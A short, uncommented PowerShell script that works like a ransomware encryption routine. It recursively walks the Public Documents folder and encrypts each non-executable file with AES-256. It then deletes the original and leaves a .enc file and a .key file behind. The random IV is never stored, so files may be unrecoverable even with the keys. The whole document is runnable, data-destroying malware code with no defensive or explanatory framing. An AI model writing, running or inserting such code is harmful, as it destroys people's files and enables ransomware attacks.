$exclude = @(".exe", ".dll", ".lnk");
$files = Get-ChildItem -Path C:\Users\Public\Documents -Recurse -File;
foreach ($file in $files) {
    if ($exclude -notcontains $file.Extension) {
        $aes = New-Object System.Security.Cryptography.AesManaged;
        $aes.KeySize = 256;
        $aes.GenerateKey();
        $key = [Convert]::ToBase64String($aes.Key);
        $data = [System.IO.File]::ReadAllBytes($file.FullName);
        $enc = $aes.CreateEncryptor();
        $cipher = $enc.TransformFinalBlock($data, 0, $data.Length);
        [System.IO.File]::WriteAllBytes("$($file.FullName).enc", $cipher);
        Remove-Item $file.FullName;
        Add-Content -Path "$($file.FullName).key" -Value $key;
    }
}
